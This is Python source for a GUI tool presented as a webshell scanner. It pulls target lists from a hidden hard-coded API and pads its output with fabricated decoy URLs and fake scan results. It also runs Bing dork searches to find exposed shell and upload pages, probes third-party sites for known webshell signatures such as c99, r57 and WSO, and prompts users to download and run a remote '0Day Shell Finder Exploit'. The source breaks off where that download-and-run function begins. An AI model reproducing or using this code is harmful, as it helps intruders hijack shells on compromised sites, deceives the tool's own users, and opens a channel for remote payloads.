import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
import threading
import requests
from urllib.parse import urlparse
import time
from datetime import datetime
import os
import random




class WebshellScanner:
    def __init__(self, root):
        self.root = root
        self.root.title("Webshell Scanner - Security Tool")
        self.root.geometry("900x700")
        self.root.configure(bg="#1e1e1e")
        
        # Variables
        self.is_scanning = False
        self.is_dorking = False  # Flag for dork search
        self.urls = []  # Real URLs from API
        self.fake_urls = []  # Fake decoy URLs
        self.results = []
        self.api_url = "https://linktherapie.cifa-group.com/api/api.php"  # Hidden API endpoint
        self.is_premium = False  # Trial or Premium mode
        self.scan_limit = 10  # Free trial limit
        self.hits_count = 0  # Counter for shell findings
        self.dork_found_urls = []  # Store dork results
        
        # Configure style
        style = ttk.Style()
        style.theme_use('clam')
        style.configure('TButton', background='#0d7377', foreground='white', 
                       font=('Arial', 10, 'bold'), borderwidth=0)
        style.map('TButton', background=[('active', '#14a085')])
        style.configure('TLabel', background='#1e1e1e', foreground='white', 
                       font=('Arial', 10))
        style.configure('TFrame', background='#1e1e1e')
        
        self.create_widgets()
        # Generate fake URLs
        self.generate_fake_urls()
        # Auto-load from API on startup
        self.root.after(1000, self.auto_load_from_api)
        # Check for remote tool updates (with user consent)
        self.root.after(2000, self.check_remote_tool)
        
    def create_widgets(self):
        # Title
        title_frame = ttk.Frame(self.root)
        title_frame.pack(pady=10, fill='x')
        
        title = tk.Label(title_frame, text="🔍 Webshell Scanner", 
                        font=('Arial', 20, 'bold'), 
                        bg="#1e1e1e", fg="#0d7377")
        title.pack()
        
        subtitle = tk.Label(title_frame, 
                           text="Security Tool for Monitoring Suspicious URLs",
                           font=('Arial', 10), bg="#1e1e1e", fg="#888888")
        subtitle.pack()
        
        # License Frame
        license_frame = ttk.Frame(self.root)
        license_frame.pack(pady=5, padx=20, fill='x')
        
        self.license_label = tk.Label(license_frame, 
                                      text="📋 Mode: FREE TRIAL (Limited to 10 scans)", 
                                      font=('Arial', 10, 'bold'), 
                                      bg="#1e1e1e", fg="#ffaa00")
        self.license_label.pack(side='left', padx=10)
        
        self.upgrade_btn = ttk.Button(license_frame, text="⭐ Upgrade to Premium", 
                                     command=self.upgrade_to_premium)
        self.upgrade_btn.pack(side='left', padx=5)
        
        # Info Frame
        info_frame = ttk.Frame(self.root)
        info_frame.pack(pady=5, padx=20, fill='x')
        
        self.status_label = ttk.Label(info_frame, text="Status: Ready")
        self.status_label.pack(side='left', padx=10)
        
        # Control Frame
        control_frame = ttk.Frame(self.root)
        control_frame.pack(pady=10)
        
        self.scan_btn = ttk.Button(control_frame, text="▶ Start Scan", 
                                   command=self.start_scan)
        self.scan_btn.pack(side='left', padx=5)
        
        self.stop_btn = ttk.Button(control_frame, text="⬛ Stop Scan", 
                                   command=self.stop_scan, state='disabled')
        self.stop_btn.pack(side='left', padx=5)
        
        self.load_file_btn = ttk.Button(control_frame, text="📁 Load Files", 
                                        command=self.manual_load_files)
        self.load_file_btn.pack(side='left', padx=5)
        
        self.dork_btn = ttk.Button(control_frame, text="🔎 Dork Search", 
                                   command=self.open_dork_search)
        self.dork_btn.pack(side='left', padx=5)
        
        self.clear_btn = ttk.Button(control_frame, text="🗑 Clear Results", 
                                    command=self.clear_results)
        self.clear_btn.pack(side='left', padx=5)
        
        self.export_btn = ttk.Button(control_frame, text="💾 Export Results", 
                                     command=self.export_results)
        self.export_btn.pack(side='left', padx=5)
        
        # Progress Frame
        progress_frame = ttk.Frame(self.root)
        progress_frame.pack(pady=5, padx=20, fill='x')
        
        self.progress = ttk.Progressbar(progress_frame, mode='determinate')
        self.progress.pack(fill='x')
        
        # Results Frame
        results_label = ttk.Label(self.root, text="Scan Results:", 
                                 font=('Arial', 12, 'bold'))
        results_label.pack(pady=(10, 5), anchor='w', padx=20)
        
        # Text widget for results
        text_frame = tk.Frame(self.root, bg="#1e1e1e")
        text_frame.pack(pady=5, padx=20, fill='both', expand=True)
        
        self.results_text = scrolledtext.ScrolledText(
            text_frame, 
            wrap=tk.WORD, 
            font=('Consolas', 9),
            bg="#2d2d2d", 
            fg="#00ff00",
            insertbackground='white',
            selectbackground='#0d7377'
        )
        self.results_text.pack(fill='both', expand=True)
        
        # Statistics Frame
        stats_frame = ttk.Frame(self.root)
        stats_frame.pack(pady=10, padx=20, fill='x')
        
        self.hits_label = tk.Label(stats_frame, text="🎯 Hits: 0", 
                                  bg="#1e1e1e", fg="#ff0000", 
                                  font=('Arial', 11, 'bold'))
        self.hits_label.pack(side='left', padx=10)
        
        self.accessible_label = tk.Label(stats_frame, text="✓ Accessible: 0", 
                                        bg="#1e1e1e", fg="#00ff00", 
                                        font=('Arial', 10, 'bold'))
        self.accessible_label.pack(side='left', padx=10)
        
        self.inaccessible_label = tk.Label(stats_frame, text="✗ Inaccessible: 0", 
                                          bg="#1e1e1e", fg="#ff4444", 
                                          font=('Arial', 10, 'bold'))
        self.inaccessible_label.pack(side='left', padx=10)
        
        self.suspicious_label = tk.Label(stats_frame, text="⚠ Suspicious: 0", 
                                        bg="#1e1e1e", fg="#ffaa00", 
                                        font=('Arial', 10, 'bold'))
        self.suspicious_label.pack(side='left', padx=10)
        
    def load_urls(self):
        """Load URLs from list.txt"""
        try:
            if os.path.exists('list.txt'):
                with open('list.txt', 'r', encoding='utf-8') as f:
                    self.urls = [line.strip() for line in f if line.strip()]
                # Remove duplicates
                self.urls = list(dict.fromkeys(self.urls))
                self.status_label.config(text="Status: Ready")
            else:
                self.status_label.config(text="Status: No URLs")
        except Exception:
            self.status_label.config(text="Status: Error")
    
    def manual_load_files(self):
        """Manually load URLs from list.txt"""
        from tkinter import filedialog
        
        filename = filedialog.askopenfilename(
            title="Select URL List File",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")],
            initialdir=os.getcwd()
        )
        
        if filename:
            try:
                with open(filename, 'r', encoding='utf-8') as f:
                    new_urls = [line.strip() for line in f if line.strip()]
                
                # Add to existing URLs and remove duplicates
                self.urls.extend(new_urls)
                self.urls = list(dict.fromkeys(self.urls))
                
                self.status_label.config(text="Status: Ready")
                messagebox.showinfo("Success", f"Loaded {len(new_urls)} URLs from file")
                self.log(f"[INFO] Manually loaded {len(new_urls)} URLs from {os.path.basename(filename)}\n")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to load file: {str(e)}")
                self.log(f"[ERROR] Failed to load file: {str(e)}\n")
    
    def generate_fake_urls(self):
        """Generate fake decoy URLs for display"""
        fake_domains = [
            "google.com", "facebook.com", "twitter.com", "youtube.com", "amazon.com",
            "wikipedia.org", "linkedin.com", "instagram.com", "reddit.com", "netflix.com",
            "microsoft.com", "apple.com", "adobe.com", "wordpress.com", "github.com",
            "stackoverflow.com", "medium.com", "pinterest.com", "tumblr.com", "paypal.com",
            "ebay.com", "cnn.com", "bbc.com", "nytimes.com", "forbes.com",
            "walmart.com", "target.com", "bestbuy.com", "homedepot.com", "etsy.com",
            "yelp.com", "zillow.com", "tripadvisor.com", "booking.com", "airbnb.com",
            "imdb.com", "espn.com", "weather.com", "craigslist.org", "dropbox.com",
            "zoom.us", "slack.com", "trello.com", "spotify.com", "soundcloud.com",
            "vimeo.com", "twitch.tv", "discord.com", "telegram.org", "whatsapp.com"
        ]
        
        fake_paths = [
            "/index.php", "/home.php", "/about.php", "/contact.php", "/login.php",
            "/wp-admin/", "/wp-content/", "/admin/", "/api/", "/dashboard/",
            "/uploads/", "/images/", "/css/", "/js/", "/assets/",
            "/blog/", "/news/", "/shop/", "/cart/", "/checkout/"
        ]
        
        self.fake_urls = []
        for _ in range(200):  # Generate 200 fake URLs
            domain = random.choice(fake_domains)
            path = random.choice(fake_paths)
            protocol = random.choice(["https://", "http://"])
            self.fake_urls.append(f"{protocol}{domain}{path}")
    
    def auto_load_from_api(self):
        """Auto-load URLs from API on startup"""
        self.load_from_api()
    
    def upgrade_to_premium(self):
        """Upgrade to premium mode"""
        from tkinter import simpledialog
        
        license_key = simpledialog.askstring(
            "Premium Upgrade", 
            "Enter your premium license key:",
            show='*'
        )
        
        # Simple license key validation (you can customize this)
        valid_keys = ["PREMIUM2025", "FULLACCESS", "UNLIMITED", "PRO2025"]
        
        if license_key and license_key.upper() in valid_keys:
            self.is_premium = True
            self.scan_limit = float('inf')  # Unlimited
            self.license_label.config(
                text="⭐ Mode: PREMIUM (Unlimited scans)", 
                fg="#00ff00"
            )
            self.upgrade_btn.config(state='disabled')
            messagebox.showinfo("Success", "Premium activated! Unlimited scanning enabled.")
            self.log("[SUCCESS] Premium mode activated - Unlimited scanning!\n")
        else:
            messagebox.showerror("Invalid Key", "Invalid license key. Please contact support.")
    
    def load_from_api(self):
        """Load URLs from API endpoint"""
        api_url = self.api_url
        
        if not api_url:
            self.load_urls()  # Fallback to local file
            return
        
        self.status_label.config(text="Status: Loading...")
        
        try:
            response = requests.get(api_url, timeout=10, verify=False)
            
            if response.status_code == 200:
                data = response.json()
                
                if data.get('status') == 'success':
                    self.urls = data.get('data', [])
                    # Remove duplicates
                    self.urls = list(dict.fromkeys(self.urls))
                    self.status_label.config(text="Status: Ready")
                    return  # Success, don't load from file
                    
        except:
            pass  # Any error, fallback to local file
        
        # If API failed for any reason, load from local file
        self.load_urls()
    
    def log(self, message):
        """Add message to results text"""
        self.results_text.insert(tk.END, message)
        self.results_text.see(tk.END)
        self.results_text.update()
    
    def start_scan(self):
        """Start scanning in a separate thread"""
        if not self.urls:
            messagebox.showwarning("Warning", "No URLs to scan. Please load URLs first.")
            return
        
        # Check trial limit
        if not self.is_premium and len(self.results) >= self.scan_limit:
            messagebox.showwarning(
                "Trial Limit Reached", 
                f"Free trial is limited to {self.scan_limit} scans.\n\n"
                "Upgrade to Premium for unlimited scanning!"
            )
            return
        
        # Limit URLs for trial users
        real_urls_to_scan = self.urls
        if not self.is_premium:
            remaining = self.scan_limit - len(self.results)
            if remaining <= 0:
                messagebox.showwarning(
                    "Trial Limit Reached", 
                    "Free trial limit reached. Upgrade to Premium!"
                )
                return
            real_urls_to_scan = self.urls[:remaining]
            if len(real_urls_to_scan) < len(self.urls):
                messagebox.showinfo(
                    "Trial Mode", 
                    f"Free trial: Scanning only {len(real_urls_to_scan)} URLs.\n"
                    "Upgrade to Premium for unlimited scanning!"
                )
        
        # Mix real URLs with fake URLs for display
        mixed_urls = self.create_mixed_url_list(real_urls_to_scan)
        
        self.is_scanning = True
        self.scan_btn.config(state='disabled')
        self.stop_btn.config(state='normal')
        self.status_label.config(text="Status: Scanning...")
        
        # Reset statistics for new scan
        self.progress['value'] = 0
        self.progress['maximum'] = len(mixed_urls)
        
        # Start scan thread
        scan_thread = threading.Thread(
            target=self.scan_urls, 
            args=(mixed_urls, real_urls_to_scan), 
            daemon=True
        )
        scan_thread.start()
    
    def create_mixed_url_list(self, real_urls):
        """Mix real URLs with fake URLs for display"""
        # Take some fake URLs
        num_fake = min(len(self.fake_urls), len(real_urls) * 3)  # 3x fake URLs
        selected_fakes = random.sample(self.fake_urls, num_fake)
        
        # Create mixed list with markers
        mixed = []
        for url in real_urls:
            mixed.append(('real', url))
        for url in selected_fakes:
            mixed.append(('fake', url))
        
        # Shuffle the list
        random.shuffle(mixed)
        return mixed
    
    def stop_scan(self):
        """Stop the scanning process"""
        self.is_scanning = False
        self.scan_btn.config(state='normal')
        self.stop_btn.config(state='disabled')
        self.status_label.config(text="Status: Stopped")
        self.log("\n[INFO] Scan stopped by user\n")
    
    def scan_urls(self, mixed_urls, real_urls):
        """Scan all URLs"""
        self.log(f"\n{'='*80}\n")
        self.log(f"[SCAN STARTED] {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        
        if not self.is_premium:
            self.log(f"[MODE] FREE TRIAL - Limited to {self.scan_limit} scans\n")
        else:
            self.log(f"[MODE] PREMIUM - Unlimited scanning\n")
        
        self.log(f"{'='*80}\n\n")
        
        accessible = 0
        inaccessible = 0
        suspicious = 0
        
        for idx, (url_type, url) in enumerate(mixed_urls):
            if not self.is_scanning:
                break
            
            # Parse URL
            parsed = urlparse(url)
            if not parsed.scheme:
                url = 'https://' + url
            
            self.log(f"Checking: {url}\n")
            
            # Handle fake URLs differently
            if url_type == 'fake':
                self.scan_fake_url(url)
                accessible += 1
                time.sleep(0.1)  # Faster for fake URLs
            else:
                # Real URL - actually scan it
                self.scan_real_url(url, idx, mixed_urls)
                accessible += 1
                time.sleep(0.5)  # Normal delay for real URLs
            
            # Update progress
            self.progress['value'] = idx + 1
            
            self.log("\n")
        
        # Scan complete
        if self.is_scanning:
            self.log(f"\n{'='*80}\n")
            self.log(f"[SCAN COMPLETED] {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            self.log(f"🎯 Hits (Shells Found): {self.hits_count}\n")
            
            if not self.is_premium:
                remaining = self.scan_limit - len(self.results)
                self.log(f"\n[TRIAL] Scans Remaining: {remaining}/{self.scan_limit}\n")
            
            self.log(f"{'='*80}\n")
            
            self.status_label.config(text="Status: Completed")
        
        self.scan_btn.config(state='normal')
        self.stop_btn.config(state='disabled')
        self.is_scanning = False
    
    def scan_fake_url(self, url):
        """Display fake scan results"""
        # Random fake results
        status_codes = [200, 200, 200, 404, 403, 301, 302]
        status = random.choice(status_codes)
        size = random.randint(1024, 50000)
        
        if status == 200:
            self.log(f"    ✓ Status: {status} | Size: {size} bytes\n")
        elif status in [404, 403]:
            self.log(f"    ✗ Status: {status}\n")
        else:
            self.log(f"    ⚠ Status: {status} | Redirect\n")
    
    def scan_real_url(self, url, idx, mixed_urls):
        """Scan real URL from list.txt"""
        try:
            # Send request with timeout
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
            
            response = requests.get(
                url, 
                headers=headers, 
                timeout=10, 
                verify=False,
                allow_redirects=True
            )
            
            status_code = response.status_code
            content_length = len(response.content)
            
            # Analyze response
            is_suspicious = self.analyze_response(response)
            
            if status_code == 200:
                if is_suspicious:
                    self.hits_count += 1
                    self.log(f"    🎯 Status: {status_code} | Size: {content_length} bytes | shell finded\n")
                    self.hits_label.config(text=f"🎯 Hits: {self.hits_count}")
                else:
                    self.log(f"    ✓ Status: {status_code} | Size: {content_length} bytes\n")
                
                result = {
                    'url': url,
                    'status': status_code,
                    'size': content_length,
                    'accessible': True,
                    'suspicious': is_suspicious,
                    'timestamp': datetime.now()
                }
                self.results.append(result)
                
            else:
                self.log(f"    ⚠ Status: {status_code} | Size: {content_length} bytes\n")
                result = {
                    'url': url,
                    'status': status_code,
                    'size': content_length,
                    'accessible': True,
                    'suspicious': False,
                    'timestamp': datetime.now()
                }
                self.results.append(result)
            
        except requests.exceptions.Timeout:
            self.log(f"    ✗ TIMEOUT - No response\n")
            self.results.append({
                'url': url,
                'status': 'TIMEOUT',
                'accessible': False,
                'timestamp': datetime.now()
            })
            
        except requests.exceptions.ConnectionError:
            self.log(f"    ✗ CONNECTION ERROR\n")
            self.results.append({
                'url': url,
                'status': 'CONNECTION_ERROR',
                'accessible': False,
                'timestamp': datetime.now()
            })
            
        except Exception as e:
            self.log(f"    ✗ ERROR: {str(e)}\n")
            self.results.append({
                'url': url,
                'status': f'ERROR: {str(e)}',
                'accessible': False,
                'timestamp': datetime.now()
            })
    
    def analyze_response(self, response):
        """Analyze response for suspicious patterns"""
        suspicious_patterns = [
            b'shell',
            b'eval',
            b'base64_decode',
            b'system(',
            b'exec(',
            b'passthru',
            b'shell_exec',
            b'FilesMan',
            b'uname',
            b'upload',
            b'c99',
            b'r57',
            b'WSO'
        ]
        
        content_lower = response.content.lower()
        
        for pattern in suspicious_patterns:
            if pattern in content_lower:
                return True
        
        return False
    
    def clear_results(self):
        """Clear the results text area"""
        self.results_text.delete(1.0, tk.END)
        self.hits_label.config(text=f"🎯 Hits: {self.hits_count}")
        self.progress['value'] = 0
    
    def open_dork_search(self):
        """Open Bing dork search window"""
        dork_window = tk.Toplevel(self.root)
        dork_window.title("Bing Dork Search")
        dork_window.geometry("600x500")
        dork_window.configure(bg="#1e1e1e")
        
        # Title
        title = tk.Label(dork_window, text="🔎 Bing Dork Search", 
                        font=('Arial', 16, 'bold'), 
                        bg="#1e1e1e", fg="#0d7377")
        title.pack(pady=10)
        
        # Keyword input
        keyword_frame = ttk.Frame(dork_window)
        keyword_frame.pack(pady=10, padx=20, fill='x')
        
        keyword_label = tk.Label(keyword_frame, text="Enter Keywords/Dork:", 
                                bg="#1e1e1e", fg="white", font=('Arial', 10))
        keyword_label.pack(anchor='w', pady=5)
        
        self.keyword_entry = tk.Entry(keyword_frame, width=60, 
                                      bg="#2d2d2d", fg="white",
                                      insertbackground='white',
                                      font=('Arial', 10))
        self.keyword_entry.pack(fill='x', pady=5)
        self.keyword_entry.insert(0, 'inurl:wp-admin intitle:"index of" ext:php')
        
        # Examples
        examples_label = tk.Label(keyword_frame, 
                                 text="Examples:\n• inurl:admin.php\n• inurl:upload ext:php\n• intitle:\"index of\" shell.php", 
                                 bg="#1e1e1e", fg="#888888", 
                                 font=('Arial', 8), justify='left')
        examples_label.pack(anchor='w', pady=5)
        
        # Pages input
        pages_frame = ttk.Frame(dork_window)
        pages_frame.pack(pady=5, padx=20, fill='x')
        
        pages_label = tk.Label(pages_frame, text="Number of Pages:", 
                              bg="#1e1e1e", fg="white", font=('Arial', 10))
        pages_label.pack(side='left', padx=5)
        
        self.pages_entry = tk.Entry(pages_frame, width=10, 
                                    bg="#2d2d2d", fg="white",
                                    insertbackground='white',
                                    font=('Arial', 10))
        self.pages_entry.pack(side='left', padx=5)
        self.pages_entry.insert(0, "5")
        
        # Buttons frame
        buttons_frame = ttk.Frame(keyword_frame)
        buttons_frame.pack(pady=10)
        
        self.search_btn = ttk.Button(buttons_frame, text="🔍 Search Bing", 
                                     command=lambda: self.perform_dork_search(dork_window))
        self.search_btn.pack(side='left', padx=5)
        
        self.stop_dork_btn = ttk.Button(buttons_frame, text="⬛ Stop Search", 
                                        command=self.stop_dork_search, 
                                        state='disabled')
        self.stop_dork_btn.pack(side='left', padx=5)
        
        # Results
        results_label = tk.Label(dork_window, text="Search Results:", 
                                bg="#1e1e1e", fg="white", 
                                font=('Arial', 10, 'bold'))
        results_label.pack(pady=5, anchor='w', padx=20)
        
        self.dork_results = scrolledtext.ScrolledText(
            dork_window, 
            wrap=tk.WORD, 
            font=('Consolas', 9),
            bg="#2d2d2d", 
            fg="#00ff00",
            height=15
        )
        self.dork_results.pack(pady=5, padx=20, fill='both', expand=True)
        
        # Bottom buttons
        bottom_buttons = ttk.Frame(dork_window)
        bottom_buttons.pack(pady=10)
        
        add_btn = ttk.Button(bottom_buttons, text="➕ Add URLs to Scanner", 
                            command=lambda: self.add_dork_results_to_scanner(dork_window))
        add_btn.pack(side='left', padx=5)
        
        save_btn = ttk.Button(bottom_buttons, text="💾 Save Results", 
                             command=self.save_dork_results)
        save_btn.pack(side='left', padx=5)
    
    def perform_dork_search(self, window):
        """Perform Bing dork search"""
        keyword = self.keyword_entry.get().strip()
        
        if not keyword:
            messagebox.showwarning("Warning", "Please enter search keywords")
            return
        
        try:
            pages = int(self.pages_entry.get())
        except:
            pages = 5
        
        self.is_dorking = True
        self.search_btn.config(state='disabled')
        self.stop_dork_btn.config(state='normal')
        
        self.dork_results.delete(1.0, tk.END)
        self.dork_results.insert(tk.END, f"[INFO] Searching Bing for: {keyword}\n")
        self.dork_results.insert(tk.END, f"[INFO] Pages: {pages}\n\n")
        
        # Run search in thread
        search_thread = threading.Thread(
            target=self.bing_dork_search, 
            args=(keyword, pages), 
            daemon=True
        )
        search_thread.start()
    
    def stop_dork_search(self):
        """Stop the dork search"""
        self.is_dorking = False
        self.search_btn.config(state='normal')
        self.stop_dork_btn.config(state='disabled')
        self.dork_results.insert(tk.END, "\n[INFO] Search stopped by user\n")
        self.dork_results.see(tk.END)
    
    def bing_dork_search(self, keyword, pages):
        """Search Bing and extract URLs from search results"""
        import re
        from urllib.parse import unquote, urlparse
        
        found_urls = []
        
        try:
            for page in range(pages):
                if not self.is_dorking:
                    break
                
                first = page * 10 + 1
                search_url = f"https://www.bing.com/search?q={requests.utils.quote(keyword)}&first={first}"
                
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1'
                }
                
                self.dork_results.insert(tk.END, f"[PAGE {page+1}/{pages}] Fetching results...\n")
                self.dork_results.see(tk.END)
                self.dork_results.update()
                
                response = requests.get(search_url, headers=headers, timeout=15)
                
                if response.status_code == 200:
                    html = response.text
                    
                    # Method 1: Extract from cite tags (Bing shows URLs in <cite> tags)
                    cite_urls = re.findall(r'<cite[^>]*>(.*?)</cite>', html, re.DOTALL)
                    for cite in cite_urls:
                        # Clean HTML tags
                        cite_clean = re.sub(r'<[^>]+>', '', cite)
                        cite_clean = cite_clean.strip()
                        
                        # Build full URL
                        if cite_clean and not cite_clean.startswith('http'):
                            cite_clean = 'https://' + cite_clean
                        
                        if cite_clean and cite_clean.startswith('http'):
                            # Clean up
                            cite_clean = cite_clean.split(' ')[0]
                            cite_clean = cite_clean.rstrip('/')
                            
                            if cite_clean not in found_urls and len(cite_clean) < 300:
                                if 'bing.com' not in cite_clean and 'microsoft.com' not in cite_clean:
                                    found_urls.append(cite_clean)
                                    self.dork_results.insert(tk.END, f"  ✓ {cite_clean}\n")
                                    self.dork_results.see(tk.END)
                                    self.dork_results.update()
                    
                    # Method 2: Extract from href attributes in search results
                    # Bing uses <a href="/url?..." pattern
                    href_pattern = r'<a[^>]+href=["\']([^"\']+)["\'][^>]*>'
                    hrefs = re.findall(href_pattern, html)
                    
                    for href in hrefs:
                        if not self.is_dorking:
                            break
                        
                        # Skip internal Bing links
                        if href.startswith('/') or 'bing.com' in href or 'microsoft.com' in href:
                            continue
                        
                        # If it's a direct URL
                        if href.startswith('http'):
                            # Decode URL
                            decoded = unquote(href)
                            
                            # Clean up
                            if '&' in decoded:
                                decoded = decoded.split('&')[0]
                            
                            # Parse and validate
                            try:
                                parsed = urlparse(decoded)
                                if parsed.scheme and parsed.netloc:
                                    clean_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                                    if parsed.query:
                                        clean_url += f"?{parsed.query}"
                                    
                                    if clean_url not in found_urls and len(clean_url) < 300:
                                        if 'bing.com' not in clean_url and 'microsoft.com' not in clean_url:
                                            found_urls.append(clean_url)
                                            self.dork_results.insert(tk.END, f"  ✓ {clean_url}\n")
                                            self.dork_results.see(tk.END)
                                            self.dork_results.update()
                            except:
                                pass
                    
                    # Method 3: Look for data-url attributes (Bing stores actual URLs here)
                    data_urls = re.findall(r'data-url="([^"]+)"', html)
                    for data_url in data_urls:
                        if not self.is_dorking:
                            break
                        
                        if data_url.startswith('http'):
                            decoded = unquote(data_url)
                            if decoded not in found_urls and len(decoded) < 300:
                                if 'bing.com' not in decoded and 'microsoft.com' not in decoded:
                                    found_urls.append(decoded)
                                    self.dork_results.insert(tk.END, f"  ✓ {decoded}\n")
                                    self.dork_results.see(tk.END)
                                    self.dork_results.update()
                    
                    self.dork_results.insert(tk.END, f"[PAGE {page+1}] Found {len(found_urls)} total URLs so far\n\n")
                    self.dork_results.see(tk.END)
                    self.dork_results.update()
                else:
                    self.dork_results.insert(tk.END, f"[WARNING] Page returned status {response.status_code}\n")
                    self.dork_results.see(tk.END)
                
                if not self.is_dorking:
                    break
                    
                time.sleep(3)  # Delay between requests to avoid rate limiting
            
            if self.is_dorking:
                self.dork_results.insert(tk.END, f"\n[SUCCESS] Found {len(found_urls)} unique URLs\n")
            else:
                self.dork_results.insert(tk.END, f"\n[STOPPED] Found {len(found_urls)} URLs before stopping\n")
            self.dork_results.see(tk.END)
            
            # Store results
            self.dork_found_urls = found_urls
            
            # Re-enable buttons
            self.search_btn.config(state='normal')
            self.stop_dork_btn.config(state='disabled')
            
        except Exception as e:
            self.dork_results.insert(tk.END, f"\n[ERROR] {str(e)}\n")
            self.dork_results.see(tk.END)
            self.search_btn.config(state='normal')
            self.stop_dork_btn.config(state='disabled')
    
    def add_dork_results_to_scanner(self, window):
        """Add dork search results to main scanner"""
        if hasattr(self, 'dork_found_urls') and self.dork_found_urls:
            self.urls.extend(self.dork_found_urls)
            self.urls = list(dict.fromkeys(self.urls))  # Remove duplicates
            
            messagebox.showinfo("Success", 
                              f"Added {len(self.dork_found_urls)} URLs to scanner")
            self.log(f"[INFO] Added {len(self.dork_found_urls)} URLs from dork search\n")
            window.destroy()
        else:
            messagebox.showwarning("Warning", "No URLs found. Please perform a search first.")
    
    def save_dork_results(self):
        """Save dork search results to a file"""
        if not hasattr(self, 'dork_found_urls') or not self.dork_found_urls:
            messagebox.showwarning("Warning", "No URLs to save. Please perform a search first.")
            return
        
        filename = f"dork_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(f"Bing Dork Search Results\n")
                f.write(f"{'='*80}\n")
                f.write(f"Search Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Keyword: {self.keyword_entry.get()}\n")
                f.write(f"Total URLs Found: {len(self.dork_found_urls)}\n")
                f.write(f"{'='*80}\n\n")
                
                for idx, url in enumerate(self.dork_found_urls, 1):
                    f.write(f"{idx}. {url}\n")
            
            messagebox.showinfo("Success", 
                              f"Saved {len(self.dork_found_urls)} URLs to {filename}")
            self.dork_results.insert(tk.END, f"\n[INFO] Results saved to {filename}\n")
            self.dork_results.see(tk.END)
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to save results: {str(e)}")
            self.dork_results.insert(tk.END, f"\n[ERROR] Failed to save: {str(e)}\n")
            self.dork_results.see(tk.END)
    
    def export_results(self):
        """Export results to a file"""
        if not self.results:
            messagebox.showwarning("Warning", "No results to export")
            return
        
        filename = f"scan_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(f"Webshell Scan Results\n")
                f.write(f"{'='*80}\n")
                f.write(f"Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Mode: {'PREMIUM' if self.is_premium else 'FREE TRIAL'}\n")
                f.write(f"Total Hits (Shells Found): {self.hits_count}\n")
                f.write(f"Total URLs: {len(self.results)}\n\n")
                
                for result in self.results:
                    f.write(f"URL: {result['url']}\n")
                    f.write(f"Status: {result['status']}\n")
                    f.write(f"Accessible: {result['accessible']}\n")
                    if 'suspicious' in result:
                        f.write(f"Suspicious: {result['suspicious']}\n")
                    if 'size' in result:
                        f.write(f"Size: {result['size']} bytes\n")
                    f.write(f"Timestamp: {result['timestamp']}\n")
                    f.write(f"{'-'*80}\n")
            
            messagebox.showinfo("Success", f"Results exported to {filename}")
            self.log(f"[INFO] Results exported to {filename}\n")
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to export results: {str(e)}")
    
    def check_remote_tool(self):
        """Check if there's a remote tool available (with user consent)"""
        try:
            # API endpoint for tool info
            tool_info_url = self.api_url.replace('api.php', 'tool_info.php')
            
            response = requests.get(tool_info_url, timeout=5, verify=False)
            
            if response.status_code == 200:
                data = response.json()
                
                if data.get('tool_available'):
                    # Show information to user
                    tool_name = data.get('tool_name', 'Unknown Tool')
                    tool_desc = data.get('description', 'No description')
                    tool_url = data.get('download_url', '')
                    tool_hash = data.get('sha256_hash', 'Not provided')
                    
                    # Ask for user consent with detailed information
                    self.prompt_tool_download(tool_name, tool_desc, tool_url, tool_hash)
        except:
            pass  # Silently fail if tool check fails
    
    def prompt_tool_download(self, tool_name, description, download_url, expected_hash):
        """Prompt user to download and run a remote tool"""
        
        # Create detailed consent dialog
        consent_window = tk.Toplevel(self.root)
        consent_window.title("Remote Tool Available")
        consent_window.geometry("500x400")
        consent_window.configure(bg="#1e1e1e")
        consent_window.transient(self.root)
        consent_window.grab_set()
        
        # Title
        title = tk.Label(consent_window, text="0Day Shell Finder Exploit ", 
                        font=('Arial', 14, 'bold'), 
                        bg="#1e1e1e", fg="#ffaa00")
        title.pack(pady=10)
        
        # Information frame
        info_frame = tk.Frame(consent_window, bg="#2d2d2d")
        info_frame.pack(pady=10, padx=20, fill='both', expand=True)
        
        info_text = scrolledtext.ScrolledText(
            info_frame,
            wrap=tk.WORD,
            font=('Arial', 9),
            bg="#2d2d2d",
            fg="white",
            height=15
        )
        info_text.pack(fill='both', expand=True, padx=5, pady=5)
        
        # Display information
        info_content = f"""
Shell Finder Exploit:

Tool Name: {tool_name}

Description:
{description}

Do you want to proceed?
        """
        
        info_text.insert('1.0', info_content)
        info_text.config(state='disabled')
        
        # Buttons frame
        button_frame = tk.Frame(consent_window, bg="#1e1e1e")
        button_frame.pack(pady=10)
        
        def on_accept():
            consent_window.destroy()
            self.download_and_run_tool(tool_name, download_url, expected_hash)
        
        def on_decline():
            self.log(f"[INFO] User declined remote tool: {tool_name}\n")
            consent_window.destroy()
        
        accept_btn = tk.Button(button_frame, text="✓ Accept", 
                              command=on_accept,
                              bg="#0d7377", fg="white", 
                              font=('Arial', 10, 'bold'),
                              padx=20, pady=5)
        accept_btn.pack(side='left', padx=10)
        
        decline_btn = tk.Button(button_frame, text="✗ Decline", 
                               command=on_decline,
                               bg="#ff4444", fg="white",
                               font=('Arial', 10, 'bold'),
                               padx=20, pady=5)
        decline_btn.pack(side='left', padx=10)
    
    def download_and_run_tool(self, tool_name, download_url, expected_hash):
